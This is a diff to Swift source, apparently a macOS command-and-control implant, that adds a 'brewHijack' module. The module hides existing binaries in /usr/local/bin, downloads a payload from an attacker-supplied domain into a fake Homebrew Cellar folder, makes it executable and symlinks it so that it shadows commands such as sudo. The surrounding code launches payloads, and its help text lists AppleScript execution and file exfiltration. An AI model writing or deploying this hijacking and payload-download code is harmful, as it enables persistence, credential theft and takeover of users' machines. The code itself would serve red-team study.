@@ -211,17 +211,93 @@ public struct ASH {
                         return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: "File doesn't exist").returnDict as NSDictionary
                     }
                 case ("execute;"):
-                //Will execute payloads, this typically works better when you're in the same directory as the destination payload
-                let commandSplit = command.components(separatedBy: "; ")[safe: 1]
-                if commandSplit != nil {
-                    do {
-                        try NSWorkspace.shared.launchApplication(at: URL(fileURLWithPath: commandSplit!), options: .default, configuration: .init())
-                        return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: command + " successful").returnDict as NSDictionary
+                    //Will execute payloads, this typically works better when you're in the same directory as the destination payload
+                    let commandSplit = command.components(separatedBy: "; ")[safe: 1]
+                    if commandSplit != nil {
+                        do {
+                            try NSWorkspace.shared.launchApplication(at: URL(fileURLWithPath: commandSplit!), options: .default, configuration: .init())
+                            return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: command + " successful").returnDict as NSDictionary
+                        }
+                        catch {
+                            return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: error).returnDict as NSDictionary
+                        }
                     }
-                    catch {
-                        return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: error).returnDict as NSDictionary
+                case ("brewHijack;"):
+                    // If homebrew is installed on the target host, this module can be used to hijack it. For example, placing sudo in the /usr/local/bin directory will hijack macOS's legit sudo binary in /usr/bin/
+                    let commandSplit = command.components(separatedBy: "; ")[safe: 1]
+                    let commandHijack = commandSplit?.components(separatedBy: " ")[safe: 0]
+                    let fakeFolder = commandSplit?.components(separatedBy: " ")[safe: 1]
+                    let binary = commandSplit?.components(separatedBy: " ")[safe: 2]
+                    let domain = URL(string: (commandSplit?.components(separatedBy: " ")[safe: 3])!)
+                    let hijackCommand = fileManager.fileExists(atPath: "/usr/local/bin/" + commandHijack!)
+                    let brewExist = fileManager.fileExists(atPath: "/usr/local/bin")
+                    
+                    if brewExist == true {
+                        // Check if the command already exists. If it does, hide the symlink. This will leave the original binaries
+                        if hijackCommand == true {
+                            let letters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
+                            var fileName = ""
+                            
+                            for _ in 0...5 {
+                                fileName.append(letters.randomElement()!)
+                            }
+                            print(fileName)
+                            do {
+                                try fileManager.moveItem(atPath: "/usr/local/bin/" + commandHijack!, toPath: "/usr/local/bin/" + fileName)
+                            }
+                            catch {
+                                return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: error).returnDict as NSDictionary
+                            }
+                        }
+    
+                        // Create the folder storing the malicious command
+                        if fakeFolder != nil {
+                            do {
+                                try fileManager.createDirectory(at: URL(fileURLWithPath: "/usr/local/Cellar/" + fakeFolder!), withIntermediateDirectories: false)
+                            }
+                            catch {
+                                return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: error).returnDict as NSDictionary
+                            }
+                        }
+                        else {
+                            return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: "No folder provided").returnDict as NSDictionary
+                        }
+                        
+                        // Get the payload
+                        var request = URLRequest(url: domain!)
+                        request.httpMethod = "GET"
+                        
+                        let task = URLSession.shared.dataTask(with: request) {(data, response, error) in
+                            fileManager.createFile(atPath: "/usr/local/Cellar/" + fakeFolder! + "/" + binary!, contents: data)
+                            
+                            // Modify the payload's permissions
+                            var attributes = [FileAttributeKey: Any]()
+                            attributes[.posixPermissions] = 0o755
+                            
+                            do {
+                                // This is tied to the download of the script
+                                try fileManager.setAttributes(attributes, ofItemAtPath: "/usr/local/Cellar/" + fakeFolder! + "/" + binary!)
+                            }
+                            catch {
+                                return
+                            }
+                            do {
+                                // Symlink the new binary to the bin
+                                try fileManager.createSymbolicLink(atPath: "/usr/local/bin/" + commandHijack!, withDestinationPath: "/usr/local/Cellar/" + fakeFolder! + "/" + binary!)
+                                
+                            }
+                            catch{
+                                return
+                            }
+                        }
+                        task.resume()
+                        
+                        return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: "Command has been hijack").returnDict as NSDictionary
                     }
-                }
+                    else {
+                        return returnData(inCommand: String(progCallSplit), returnType: "Error", returnData: "Homebrew is not installed on the destination host").returnData as! NSDictionary
+                    }
+                    
                 case ("man;"):
                     let commandResult = """
                     The following are commands ran as API calls:
@@ -238,6 +314,7 @@ public struct ASH {
                     osascript; <Code> --- This will run an Apple script.
                     exfil; <binary> --- Will grab the raw data of a file. Must be in the same directory of the file.
                     execute; <App to Run> --- This will execute a payload as an API call (no shell needed). Must be in the directory of the binary to execute.
+                    brewHijack; <commandToHijack> <fakeFolderName> <binary> <domainForPayload> --- This will check to see if Homebrew is installed and hijack the Cellar.
                     """
                     return returnData(inCommand: String(progCallSplit), returnType: "String", returnData: commandResult).returnDict as NSDictionary
                 default:
